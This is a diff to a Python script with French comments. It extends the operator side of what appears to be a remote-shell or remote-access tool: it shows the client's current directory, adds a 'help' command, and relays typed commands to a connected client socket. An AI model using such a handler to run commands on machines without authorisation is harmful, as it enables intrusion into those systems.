@@ -22,13 +22,18 @@ def upload(client_socket):
 # Fonction permettant d'initier un shell intéractif sur le client
 def shell(client_socket, client_ip):
     client_socket.send(b'shell')  # Envoie de la commande
+    repertoire_actuel = client_socket.recv(4096).decode()
+    print(f'\n{repertoire_actuel}')
     print("\n[*] Taper 'quit' pour quitter le Shell\n")
     while True:
         commande_shell = input(f"[{client_ip}] Shell > ")  # Récupération de la commande Shell saisie
         if commande_shell.lower() == 'quit':  # Gestion de la sortie du Shell
             client_socket.send(b'quit')
             break
-        client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
+        elif commande_shell.lower() == 'help':
+            client_socket.send(b'help')
+        else:
+            client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
         commande_shell_received = client_socket.recv(4096).decode()  # Récupération de la réponse de la commande Shell
         print(f'\n{commande_shell_received}')  # Affichage de la réponse de la commande Shell
 
